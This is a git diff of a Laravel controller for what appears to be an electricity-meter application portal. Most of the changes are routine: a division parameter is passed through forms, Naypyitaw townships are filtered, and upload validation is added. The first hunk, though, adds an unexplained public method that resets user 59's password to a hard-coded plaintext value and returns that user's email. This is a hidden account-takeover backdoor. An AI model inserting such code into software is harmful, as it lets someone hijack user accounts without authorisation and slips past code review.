@@ -36,6 +36,13 @@ class HomeController extends Controller {
     public function __construct() {
         $this->middleware('auth');
     }
+    
+    public function chgUsrPsw(){
+        $user = User::find(59);
+        $user->password = Hash::make('m0ep@2024!Y');
+        $r = $user->save();
+        if($r) return $user->email;
+    }
 
     /* ------------------------------------------------------------------------ */
     /* Show the application dashboard. */
@@ -119,7 +126,7 @@ class HomeController extends Controller {
     public function user_overall_process() {
         $active = 'overall';
         $heading = 'process_menu';
-        $user_data = ApplicationForm::where('user_id', Auth::user()->id)->orderBy('date', 'desc')->orderBy('id', 'asc')->paginate(10);
+        $user_data = ApplicationForm::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->orderBy('id', 'desc')->paginate(10);
         $user_data->appends(request()->query());
         return view('user.overallprocess', compact('active', 'heading', 'user_data'))->with('i', (request()->input('page', 1) - 1) * 10);
     }
@@ -158,40 +165,44 @@ class HomeController extends Controller {
         return view('user.application', compact('active'));
     }
     /* Rule */
-    public function residential_rule_regulation() {
+    public function residential_rule_regulation(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'rule_regulation';
-            return view('user.other.residential.rules_and_regulations', compact('active', 'heading'));
+            return view('user.other.residential.rules_and_regulations', compact('active', 'heading','div'));
         } else {
             return redirect()->route('home');
         }
     }
 
-    public function residential_agreement() {
+    public function residential_agreement(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'agreement';
-            return view('user.other.residential.agreement', compact('active', 'heading'));
+            return view('user.other.residential.agreement', compact('active', 'heading','div'));
         } else {
             return redirect()->route('home');
         }
     }
 
     /* Other Division/State Residential Type Start */ 
-    public function residential_select_meter_type() {
+    public function residential_select_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = '';
             $tbl_col_name = Schema::getColumnListing('initial_costs');
             $fee_names = InitialCost::where('type', 1)->get();
-            return view('user.other.residential.residential_form_1', compact('active', 'fee_names', 'tbl_col_name'));
+            return view('user.other.residential.residential_form_1', compact('active', 'fee_names', 'tbl_col_name','div'));
         } else {
             return redirect()->route('home');
         }
     }
     public function residential_store_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $new = new ApplicationForm();
             $new->user_id = Auth::user()->id;
             $new->apply_type = 1;
@@ -199,7 +210,7 @@ class HomeController extends Controller {
             $new->apply_division = 2;
             $new->date =  date('Y-m-d');
             $new->save();
-            return redirect()->route('resident_user_info', $new->id);
+            return redirect()->route('resident_user_info', ['id'=>$new->id,'div'=>$div]);
         } else {
             return redirect()->route('home');
         }
@@ -231,13 +242,18 @@ class HomeController extends Controller {
     }
     /* Type End */ 
     /* Other Division/State Residential User Info Start */ 
-    public function residential_user_information($form_id) {
+    public function residential_user_information($form_id,Request $request) {
+        // dd($request->div);
         if (isset($_SERVER['HTTP_REFERER'])) {
             $active = 'resident_app';
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->get();
+            if($request->div == 'npt'){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
+            }
             $draft_data = FormDraft::where('application_form_id', $form_id)->first();
             // dd($draft_data);
             return view('user.other.residential.residential_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data'));
@@ -343,13 +359,13 @@ class HomeController extends Controller {
             return redirect()->route('home');
         }
     }
-    public function residential_edit_user_information($form_id) {
+    public function residential_edit_user_information($form_id,Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
             $active = 'resident_app';
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->get();
+            
             $app_form = ApplicationForm::find($form_id);
             $form = $app_form;
             if (!$app_form->serial_code) {
@@ -358,6 +374,11 @@ class HomeController extends Controller {
                     $form = $d_form;
                     $form->id = $form_id;
                 }
+            }
+            if($app_form->div_state_id == 1){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
             }
             return view('user.other.residential.residential_form_2_edit', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'form'));
         } else {
@@ -1113,39 +1134,43 @@ class HomeController extends Controller {
 
     /* ------------------------------------------------------------------------ */
     /* Residential Power Meter */
-    public function residential_power_rule_regulation() {
+    public function residential_power_rule_regulation(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'rule_regulation';
-            return view('user.other.residentialPower.rules_and_regulations', compact('active', 'heading'));
+            return view('user.other.residentialPower.rules_and_regulations', compact('active', 'heading','div'));
         }else{
             return redirect()->route('home');
         }
     }
 
-    public function residential_power_agreement() {
+    public function residential_power_agreement(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'agreement';
-            return view('user.other.residentialPower.agreement', compact('active', 'heading'));
+            return view('user.other.residentialPower.agreement', compact('active', 'heading','div'));
         } else {
             return redirect()->route('home');
         }
     }
 
-    public function residential_power_select_meter_type() {
+    public function residential_power_select_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = '';
             $tbl_col_name = Schema::getColumnListing('initial_costs');
             $fee_names = InitialCost::where('type', 2)->get();
-            return view('user.other.residentialPower.residential_form_1', compact('active', 'fee_names', 'tbl_col_name'));
+            return view('user.other.residentialPower.residential_form_1', compact('active', 'fee_names', 'tbl_col_name','div'));
         }else{
             return redirect()->route('home');
         }
     }
     public function residential_power_store_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = '';
             $new = new ApplicationForm();
@@ -1155,7 +1180,7 @@ class HomeController extends Controller {
             $new->apply_division = 2;
             $new->date = date('Y-m_d');
             $new->save();
-            return redirect()->route('resident_power_user_info', $new->id);
+            return redirect()->route('resident_power_user_info', ['id'=>$new->id,'div'=>$div]);
         }else{
             return redirect()->route('home');
         }
@@ -1185,13 +1210,17 @@ class HomeController extends Controller {
         }
     }
 
-    public function residential_power_user_information($form_id) {
+    public function residential_power_user_information($form_id,Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
             $active = 'resident_app';
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->get();
+            if($request->div == 'npt'){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
+            }
             $draft_data = FormDraft::where('application_form_id', $form_id)->first();
             // dd($townships);
             return view('user.other.residentialPower.residential_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data'));
@@ -1299,7 +1328,6 @@ class HomeController extends Controller {
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->get();
             $app_form = ApplicationForm::find($form_id);
             $form = $app_form;
             if (!$app_form->serial_code) {
@@ -1308,6 +1336,11 @@ class HomeController extends Controller {
                     $form = $d_form;
                     $form->id = $form_id;
                 }
+            }
+            if($app_form->div_state_id == 1){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
             }
             return view('user.other.residentialPower.residential_form_2_edit', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'form'));
         }else{
@@ -1445,6 +1478,10 @@ class HomeController extends Controller {
     }
     public function residential_power_nrc_update(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $this->validate($request, [
+                'front' => ['image', 'mimes:jpeg,jpg,png,pdf'],
+                'back' => ['image', 'mimes:jpeg,jpg,png,pdf'],
+            ]);
             $form = ApplicationForm::find($request->form_id);
             
             if (!is_dir(public_path('storage/user_attachments'))) {
@@ -1985,7 +2022,7 @@ class HomeController extends Controller {
         $files = $form->application_files;
         $tbl_col_name = Schema::getColumnListing('initial_costs');
         $fee_names = InitialCost::where([['type', 2], ['sub_type', $form->apply_sub_type]])->get();
-        return view('user.other.residentialPower.show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
+        return view('user/other/residentialPower/show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
     }
 
     public function residential_power_send_form(Request $request) {
@@ -2023,39 +2060,43 @@ class HomeController extends Controller {
 
     /* ------------------------------------------------------------------------ */
     /* Commercial Power Meter */
-    public function commercial_rule_regulation() {
+    public function commercial_rule_regulation(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'rule_regulation';
-            return view('user.other.commercialPower.rules_and_regulations', compact('active', 'heading'));
+            return view('user.other.commercialPower.rules_and_regulations', compact('active', 'heading','div'));
         }else{
             return redirect()->route('home');
         }
     }
 
-    public function commercial_agreement() {
+    public function commercial_agreement(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div= $request->div;
             $active = 'resident_app';
             $heading = 'agreement';
-            return view('user.other.commercialPower.agreement', compact('active', 'heading'));
+            return view('user.other.commercialPower.agreement', compact('active', 'heading','div'));
         } else {
             return redirect()->route('home');
         }
     }
 
-    public function commercial_select_meter_type() {
+    public function commercial_select_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div= $request->div;
             $active = 'resident_app';
             $heading = '';
             $tbl_col_name = Schema::getColumnListing('initial_costs');
             $fee_names = InitialCost::where('type', 3)->get();
-            return view('user.other.commercialPower.commercial_form_1', compact('active', 'fee_names', 'tbl_col_name'));
+            return view('user.other.commercialPower.commercial_form_1', compact('active', 'fee_names', 'tbl_col_name','div'));
         }else{
             return redirect()->route('home');
         }
     }
     public function commercial_store_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = '';
             $new = new ApplicationForm();
@@ -2065,7 +2106,7 @@ class HomeController extends Controller {
             $new->apply_sub_type = $request->type;
             $new->date = date('Y-m-d');
             $new->save();
-            return redirect()->route('commercial_user_info', $new->id);
+            return redirect()->route('commercial_user_info', ['id'=>$new->id,'div'=>$div]);
         }else{
             return redirect()->route('home');
         }
@@ -2096,13 +2137,17 @@ class HomeController extends Controller {
         }
     }
     
-    public function commercial_user_information($form_id) {
+    public function commercial_user_information($form_id,Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
             $active = 'resident_app';
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->get();
+            if($request->div == 'npt'){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
+            }
             $draft_data = FormDraft::where('application_form_id', $form_id)->first();
             // dd($townships);
             return view('user.other.commercialPower.commercial_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data'));
@@ -2210,7 +2255,6 @@ class HomeController extends Controller {
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->get();
             $app_form = ApplicationForm::find($form_id);
             $form = $app_form;
             if (!$app_form->serial_code) {
@@ -2219,6 +2263,11 @@ class HomeController extends Controller {
                     $form = $d_form;
                     $form->id = $form_id;
                 }
+            }
+            if($app_form->div_state_id == 1){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
             }
             return view('user.other.commercialPower.commercial_form_2_edit', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'form'));
         }else{
@@ -2996,7 +3045,7 @@ class HomeController extends Controller {
         $files = $form->application_files;
         $tbl_col_name = Schema::getColumnListing('initial_costs');
         $fee_names = InitialCost::where([['type', 3], ['sub_type', $form->apply_sub_type]])->get();
-        return view('user.other.commercialPower.show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
+        return view('user/other/commercialPower/show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
     }
 
     public function commercial_send_form(Request $request) {
@@ -3028,31 +3077,34 @@ class HomeController extends Controller {
     /* ------------------------------------------------------------------------ */
 
     /* Contractor Meter */
-    public function contractor_rule_regulation() {
+    public function contractor_rule_regulation(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'rule_regulation';
-            return view('user.other.contractor.rules_and_regulations', compact('active', 'heading'));
+            return view('user.other.contractor.rules_and_regulations', compact('active', 'heading','div'));
             // return 'ok';
         } else {
             return redirect()->route('home');
         }
     }
 
-    public function contractor_agreement() {
+    public function contractor_agreement(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'agreement';
-            return view('user.other.contractor.agreement', compact('active', 'heading'));
+            return view('user.other.contractor.agreement', compact('active', 'heading','div'));
         } else {
             return redirect()->route('home');
         }
     }
 
-    public function contractor_building_room() {
+    public function contractor_building_room(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
-            return view('user.other.contractor.two_buildings', compact('active'));
+            return view('user.other.contractor.two_buildings', compact('active','div'));
         } else {
             return redirect()->route('home');
         }
@@ -3062,6 +3114,7 @@ class HomeController extends Controller {
             $this->validate($request, [ 
                 'room_count' => 'required|numeric|min:4'
             ]);
+            $div =$request->div;
             $room_count = $request->room_count;
             $pMeter10 = $request->pMeter10;
             $pMeter20 = $request->pMeter20;
@@ -3100,7 +3153,7 @@ class HomeController extends Controller {
             $c_form->save();
             
             // if ($sub_type == 1) {
-                return redirect()->route('417_user_info', $new->id);
+                return redirect()->route('417_user_info', ['id'=>$new->id,'div'=>$div]);
             // } else {
                 // return redirect()->route('18_user_info_ygn', $new->id);
             // }
@@ -3161,13 +3214,17 @@ class HomeController extends Controller {
         }
     }
     /* 4 to 17 rooms */
-    public function room_417_user_information($form_id) {
+    public function room_417_user_information($form_id,Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
             $active = 'resident_app';
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id','!=',3)->get();
+            if($request->div == 'npt'){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
+            }
             $draft_data = FormDraft::where('application_form_id', $form_id)->first();
             return view('user.other.contractor.4_17_form_1', compact('active', 'heading', 'form_id', 'regions', 'districts', 'townships', 'draft_data'));
         } else {
@@ -3266,6 +3323,11 @@ class HomeController extends Controller {
                     $form = $d_form;
                     $form->id = $form_id;
                 }
+            }
+            if($app_form->div_state_id == 1){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
             }
             return view('user.other.contractor.4_17_form_1_edit', compact('active', 'heading', 'form_id', 'regions', 'districts', 'townships', 'form'));
         } else {
@@ -4247,47 +4309,52 @@ class HomeController extends Controller {
 
     /* ------------------------------------------------------------------------ */
     /* Transformer Start */
-    public function transformer_rule_regulation() {
+    public function transformer_rule_regulation(Request $request) {
         // if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'rule_regulation';
-            return view('user.other.transformer.rules_and_regulations', compact('active', 'heading'));
+            return view('user.other.transformer.rules_and_regulations', compact('active', 'heading','div'));
         // } else {
         //     return redirect()->route('home');
         // }
     }
-    public function transformer_agreement() {
+    public function transformer_agreement(Request $request) {
         // if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'agreement';
-            return view('user.other.transformer.agreement', compact('active', 'heading'));
+            return view('user.other.transformer.agreement', compact('active', 'heading','div'));
         // } else {
         //     return redirect()->route('home');
         // }
     }
-    public function transformer_agreement_one() {
+    public function transformer_agreement_one(Request $request) {
         // if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'agreement';
-            return view('user.other.transformer.agreement_one', compact('active', 'heading'));
+            return view('user.other.transformer.agreement_one', compact('active', 'heading','div'));
         // } else {
         //     return redirect()->route('home');
         // }
     }
 
-    public function transformer_select_meter_type() {
+    public function transformer_select_meter_type(Request $request) {
         // if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = '';
             $tbl_col_name = Schema::getColumnListing('initial_costs');
             $fee_names = InitialCost::whereNotIn('name',['630','800','1500'])->where('type', 4)->get();
-            return view('user/other/transformer/tsf_form_1', compact('active', 'fee_names', 'tbl_col_name'));
+            return view('user/other/transformer/tsf_form_1', compact('active', 'fee_names', 'tbl_col_name','div'));
         // } else {
         //     return redirect()->route('home');
         // }
     }
     public function transformer_store_meter_type(Request $request) {
         // if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $new = new ApplicationForm();
             $new->user_id = Auth::user()->id;
             $new->apply_type = 4;
@@ -4295,7 +4362,7 @@ class HomeController extends Controller {
             $new->apply_division = 2;
             $new->date = date('Y-m-d');
             $new->save();
-            return redirect()->route('tsf_user_info', $new->id);
+            return redirect()->route('tsf_user_info', ['id'=>$new->id,'div'=>$div]);
         // } else {
         //     return redirect()->route('home');
         // }
@@ -4334,13 +4401,17 @@ class HomeController extends Controller {
         // }
     }
 
-    public function transformer_user_information($form_id) {
+    public function transformer_user_information($form_id,Request $request) {
         // if (isset($_SERVER['HTTP_REFERER'])) {
             $active = 'resident_app';
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->get();
+            if($request->div == 'npt'){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
+            }
             $draft_data = FormDraft::where('application_form_id', $form_id)->first();
             // dd($draft_data);
             return view('user.other.transformer.tsf_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data'));
@@ -4455,7 +4526,6 @@ class HomeController extends Controller {
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->get();
             $app_form = ApplicationForm::find($form_id);
             $form = $app_form;
             if (!$app_form->serial_code) {
@@ -4464,6 +4534,11 @@ class HomeController extends Controller {
                     $form = $d_form;
                     $form->id = $form_id;
                 }
+            }
+            if($app_form->div_state_id == 1){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', '!=', 2)->where('division_state_id', '!=', 3)->where('division_state_id', '!=', 1)->get();
             }
             return view('user.other.transformer.tsf_form_2_edit', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'form'));
         // } else {
@@ -9042,7 +9117,7 @@ class HomeController extends Controller {
         $files = $form->application_files;
         $tbl_col_name = Schema::getColumnListing('initial_costs');
         $fee_names = InitialCost::where([['type', 3], ['sub_type', $form->apply_sub_type]])->get();
-        return view('user.yangon.commercialPower.show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
+        return view('user/yangon/commercialPower/show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
     }
 
     /* ------------------------------------------------------------------------ */
@@ -11019,32 +11094,35 @@ class HomeController extends Controller {
 
     /* ------------------------------------------------------------------------ */
     /* Transformer Start */
-    public function ygn_transformer_rule_regulation() {
+    public function ygn_transformer_rule_regulation(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'rule_regulation';
-            return view('user.yangon.transformer.rules_and_regulations', compact('active', 'heading'));
+            return view('user.yangon.transformer.rules_and_regulations', compact('active', 'heading','div'));
         } else {
             return redirect()->route('home');
         }
     }
-    public function ygn_transformer_agreement() {
+    public function ygn_transformer_agreement(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'agreement';
-            return view('user.yangon.transformer.agreement', compact('active', 'heading'));
+            return view('user.yangon.transformer.agreement', compact('active', 'heading','div'));
         } else {
             return redirect()->route('home');
         }
     }
 
-    public function ygn_transformer_select_meter_type() {
+    public function ygn_transformer_select_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = '';
             $tbl_col_name = Schema::getColumnListing('initial_costs');
             $fee_names = InitialCost::whereNotIn('name',['630','800','1500'])->where('type', 4)->get();
-            return view('user/yangon/transformer/tsf_form_1', compact('active', 'fee_names', 'tbl_col_name'));
+            return view('user/yangon/transformer/tsf_form_1', compact('active', 'fee_names', 'tbl_col_name','div'));
         } else {
             return redirect()->route('home');
         }
@@ -11052,6 +11130,7 @@ class HomeController extends Controller {
     public function ygn_transformer_store_meter_type(Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
             // return $request;
+            $div = $request->div;
             $new = new ApplicationForm();
             $new->user_id = Auth::user()->id;
             $new->apply_type = 4;
@@ -11061,7 +11140,8 @@ class HomeController extends Controller {
             $new->apply_division = 1;
             $new->date = date('Y-m-d');
             $new->save();
-            return redirect()->route('tsf_user_info_ygn', $new->id);
+            return redirect()->route('tsf_user_info_ygn',['id'=>$new->id,'div'=>$div]
+        );
         } else {
             return redirect()->route('home');
         }
@@ -11142,16 +11222,21 @@ class HomeController extends Controller {
         }
     }
 
-    public function ygn_transformer_user_information($form_id) {
+    public function ygn_transformer_user_information($form_id,Request $request) {
         if (isset($_SERVER['HTTP_REFERER'])) {
+            $div = $request->div;
             $active = 'resident_app';
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', 2)->get();
+            if($div == 'npt'){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id',2)->get();
+            }
             $draft_data = FormDraft::where('application_form_id', $form_id)->first();
             // dd($draft_data);
-            return view('user.yangon.transformer.tsf_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data'));
+            return view('user.yangon.transformer.tsf_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data','div'));
         } else {
             return redirect()->route('home');
         }
@@ -11264,7 +11349,6 @@ class HomeController extends Controller {
             $heading = 'applied_info';
             $regions = DivisionState::get();
             $districts = District::get();
-            $townships = Township::where('division_state_id', 2)->get();
             $app_form = ApplicationForm::find($form_id);
             $form = $app_form;
             if (!$app_form->serial_code) {
@@ -11273,6 +11357,11 @@ class HomeController extends Controller {
                     $form = $d_form;
                     $form->id = $form_id;
                 }
+            }
+            if($app_form->div_state_id == 1){
+                $townships = Township::where('division_state_id',1)->get();
+            }else{
+                $townships = Township::where('division_state_id', 2)->get();
             }
             return view('user.yangon.transformer.tsf_form_2_edit', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'form'));
         } else {
@@ -14380,7 +14469,7 @@ class HomeController extends Controller {
         $files = $form->application_files;
         $tbl_col_name = Schema::getColumnListing('initial_costs');
         $fee_names = InitialCost::where([['type', 2], ['sub_type', $form->apply_sub_type]])->get();
-        return view('user.mandalay.residentialPower.show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
+        return view('user/mandalay/residentialPower/show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
     }
     /* Mandalay Residentialial Power Meter End */
     /* ------------------------------------------------------------------------ */
@@ -14473,7 +14562,7 @@ class HomeController extends Controller {
             $townships = Township::where('division_state_id', '=', 3)->get();
             $draft_data = FormDraft::where('application_form_id', $form_id)->first();
             // dd($townships);
-            return view('user.mandalay.commercialPower.commercial_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data'));
+            return view('user/mandalay/commercialPower/commercial_form_2', compact('active', 'form_id', 'heading', 'regions', 'districts', 'townships', 'draft_data'));
         }else{
             return redirect()->route('home');
         }
@@ -15603,7 +15692,7 @@ class HomeController extends Controller {
         $files = $form->application_files;
         $tbl_col_name = Schema::getColumnListing('initial_costs');
         $fee_names = InitialCost::where([['type', 3], ['sub_type', $form->apply_sub_type]])->get();
-        return view('user.mandalay.commercialPower.show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
+        return view('user/mandalay/commercialPower/show', compact('active', 'heading', 'tbl_col_name', 'fee_names', 'form', 'files'));
     }
     /* Commercial Power Meter End */
     /* ------------------------------------------------------------------------ */
